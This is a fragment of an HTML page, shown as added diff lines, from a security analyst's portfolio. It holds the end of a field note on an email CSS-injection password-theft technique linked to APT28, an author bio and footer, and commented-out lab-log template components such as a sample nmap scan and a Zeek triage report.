+  <p>I ran my machine checks this morning because a link in a legitimate newsletter went to a dead end and I know enough now to treat that as worth checking. Everything was clean. But the research that dead link was trying to send me to explains in precise technical detail how an email I opened could have stolen my password without asking me to do anything except read it. That is not a theoretical risk. APT28 was already using the technique in April. The only thing that was missing was the public documentation explaining how it worked.</p>
+
+  <p>We were four months behind. The job now is to close that gap at the delivery layer, before the next toolkit surfaces in the next open directory, and the next four months begin.</p>
+
+  <p style="font-style:italic;color:#94a3b8;border-top:1px solid var(--rule);padding-top:1.5rem;margin-top:2rem;font-size:.88rem;line-height:1.7">This field note is based on Portswigger Research's "CSS: The Bomb Inside Your Inbox" (Gareth Heyes, August 6, 2026), presented at Black Hat USA 2026; OTX AlienVault Operation Roundish pulse (April 17, 2026); CVE-2026-5914 and CVE-2026-6300 (Microsoft MSRC, April 2026); and Dark Reading coverage of the Portswigger research (August 5, 2026). The APT28 attribution is based on the Operation Roundish OTX disclosure linking the toolkit to APT28 infrastructure targeting Ukraine's State Migration Service. The tldrsec newsletter referenced in the opening is a legitimate, verified security publication; the dead link was a broken external reference, not a malicious payload. All technical details of the CSS attack techniques are drawn directly from Portswigger's published research and proof-of-concept code. A companion Sublime Security detection rule targeting CSS injection patterns in email bodies is in development. This field note represents independent analytical work based entirely on public information.</p>
+
+</div>
+
+</div></div>
+
+<!-- ════════════════════════════════════════════════════════════
+     BIO + FOOTER — do not move, must stay outside .wrap
+     ════════════════════════════════════════════════════════════ -->
+<div class="bio">
+  <div class="bio-avatar">YI</div>
+  <div>
+    <div class="bio-name">Yana Ivanov</div>
+    <div class="bio-title">Security Analyst &nbsp;·&nbsp; Threat Intelligence &nbsp;·&nbsp; Detection Engineering</div>
+    <p class="bio-text">I'm a security researcher in Connecticut. Analysis is the part I love: tracing threat actor behavior, pulling apart supply chain attacks, and following evidence even when it lands on "unknown." When a question needs a tool that doesn't exist, I build it; most of the tools on this site started that way. Before security I spent 15 years designing enterprise software, which is why my tools assume a human will actually have to use them. I contribute detection rules to Sublime Security's open-source production ruleset. Security+ in progress. Everything here is independent work, shared as a contribution to the security community.</p>
+    <p class="bio-text" style="margin-top:.75rem"><a href="/" class="back-nav-link">Portfolio</a></p>
+  </div>
+</div>
+
+<!-- EDIT: footer spans — for WRITING: left=title/date, right=classification note -->
+<!-- For LAB LOGS: left=title/date/environment, right=← Portfolio link -->
+<!-- Writing footer example: -->
+<footer>
+  <span>The Style That Steals &nbsp;·&nbsp; Yana Ivanov &nbsp;·&nbsp; August 2026</span>
+  <span>Based on public reporting &nbsp;·&nbsp; For educational use &nbsp;·&nbsp; Independent analysis</span>
+</footer>
+
+<!-- Lab log footer example (swap above footer for this):
+<footer>
+  <span>Lab Log [N] — [Lab Title] &nbsp;·&nbsp; Yana Ivanov &nbsp;·&nbsp; [Date] &nbsp;·&nbsp; Controlled lab environment &nbsp;·&nbsp; Educational use only</span>
+  <a href="../index.html" style="color:#4a9eff;text-decoration:none;white-space:nowrap">← Portfolio</a>
+</footer>
+-->
+
+</body>
+</html>
+
+<!-- ════════════════════════════════════════════════════════════
+     LAB LOG COMPONENTS — copy-paste as needed
+     ════════════════════════════════════════════════════════════
+
+── CODE LABEL + BLOCK ──────────────────────────────────────────
+<div class="code-label">Command</div>
+<div class="code-block"><pre><span class="prompt">┌──(root㉿kali)-[/]
+└─# </span>nmap -sV 172.17.0.1
+
+<span class="comment"># -sV : Service version detection
+# Target: 172.17.0.1</span></pre></div>
+
+<div class="code-label">Output</div>
+<div class="code-block"><pre>PORT    STATE SERVICE VERSION
+<span class="highlight">111/tcp open  rpcbind 2-4 (RPC #100000)</span>
+<span class="warning">65471/tcp open  status  1 (RPC #100024)</span></pre></div>
+
+── TERMINAL WINDOW (macOS-style, for script output) ────────────
+<div class="terminal">
+  <div class="terminal-bar">
+    <div class="terminal-dot" style="background:#ef4444"></div>
+    <div class="terminal-dot" style="background:#fbbf24;margin-left:4px"></div>
+    <div class="terminal-dot" style="background:#4ade80;margin-left:4px"></div>
+    <div class="terminal-title">python3 script.py ~/Desktop/zeek-logs</div>
+  </div>
+  <pre><span class="t-bold">============================================================
+  ZEEK TRIAGE REPORT
+============================================================</span>
+
+<span class="t-blue">[ INFECTED HOST IDENTITY ]</span>
+<span class="t-dim">------------------------------------------------------------</span>
+  IP Address : 10.1.21.58
+  Hostname   : DESKTOP-ES9F3ML
+  Username   : <span class="t-red">suspicious_user</span>
+
+<span class="t-blue">[ SEVERITY SUMMARY ]</span>
+<span class="t-dim">------------------------------------------------------------</span>
+  Overall severity : <span class="t-red">CRITICAL</span></pre>
+</div>
+
+── HOST CARD (dark card for IP/host summary data) ──────────────
+<div class="host-card">
+  <div>
+    <div class="hf-label">IP Address</div>
+    <div class="hf-value">10.1.21.58</div>
+  </div>
+  <div>
+    <div class="hf-label">Hostname</div>
+    <div class="hf-value">DESKTOP-ES9F3ML</div>
+  </div>
+  <div>
+    <div class="hf-label">Threat Score</div>
+    <div class="hf-value red">CRITICAL</div>
+  </div>
+  <div>
+    <div class="hf-label">IOCs Found</div>
+    <div class="hf-value">5 domains</div>
+  </div>
+</div>
+
+── ENV BOX ─────────────────────────────────────────────────────
+<div class="env-box">
+  <div class="env-box-title">Environment Configuration</div>
+  <div class="env-grid">
+    <div class="env-item">
+      <div class="env-label">Scanning Host</div>
+      <div class="env-value">Kali Linux (kali-rolling) · Docker Container</div>
+    </div>
+    <div class="env-item">
+      <div class="env-label">Target Host</div>
+      <div class="env-value">macOS Sequoia · Apple M1 · Docker Host</div>
+    </div>
+  </div>
+</div>
+
+── COMPARE GRID (side-by-side) ─────────────────────────────────
+<div class="compare-grid">
+  <div class="compare-box left">
+    <div class="compare-label">[Left Panel Title]</div>
+    <p><strong>[Attribute]:</strong> [Description]</p>
+    <p><strong>[Attribute]:</strong> [Description]</p>
+  </div>
+  <div class="compare-box right">
+    <div class="compare-label">[Right Panel Title]</div>
+    <p><strong>[Attribute]:</strong> [Description]</p>
+    <p><strong>[Attribute]:</strong> [Description]</p>
+  </div>
+</div>
+
+── FUNCTION CARDS GRID ─────────────────────────────────────────
+<div class="fn-grid">
+  <div class="fn-card">
+    <div class="fn-name">function_name()</div>
+    <div class="fn-desc">What this function does and why it matters.</div>
+  </div>
+  <div class="fn-card">
+    <div class="fn-name">another_function()</div>
+    <div class="fn-desc">Description of second function.</div>
+  </div>
+</div>
+
+── NIST MAPPING BOX ────────────────────────────────────────────
+<div class="nist-box">
+  <div class="nist-box-title">Applicable NIST SP 800-171 Controls</div>
+  <div class="nist-items">
+    <div class="nist-item">
+      <span class="nist-control">3.13.6</span>
+      <span class="nist-desc"><strong>Deny by default.</strong> Implement deny-by-default / allow-by-exception for network communications.</span>
+    </div>
+    <div class="nist-item">
+      <span class="nist-control">3.4.6</span>
+      <span class="nist-desc"><strong>Least functionality.</strong> Configure systems to provide only essential capabilities.</span>
+    </div>
+  </div>
+</div>
+
+════════════════════════════════════════════════════════════ -->
